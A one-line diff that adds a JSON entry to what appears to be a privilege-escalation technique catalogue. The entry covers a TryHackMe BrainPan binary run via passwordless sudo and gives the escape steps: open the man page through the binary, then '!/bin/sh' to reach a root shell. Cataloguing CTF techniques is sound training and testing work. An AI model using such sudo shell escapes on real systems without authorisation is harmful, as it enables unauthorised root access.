@@ -1,0 +1,1 @@
+{"id":"sudo_anansi_util","category":"SUDO_NOPASSWD_CUSTOM","binary":"anansi_util","cve":null,"exploitation":["sudo {{binary}} manual man","!/bin/sh"],"post_exploit":["id"],"notes":"CTF-specific (TryHackMe/BrainPan). Calls man internally; escapes to shell.","source":"tryhackme/BrainPan","tags":["sudo","nopasswd","ctf"],"severity":"high"}
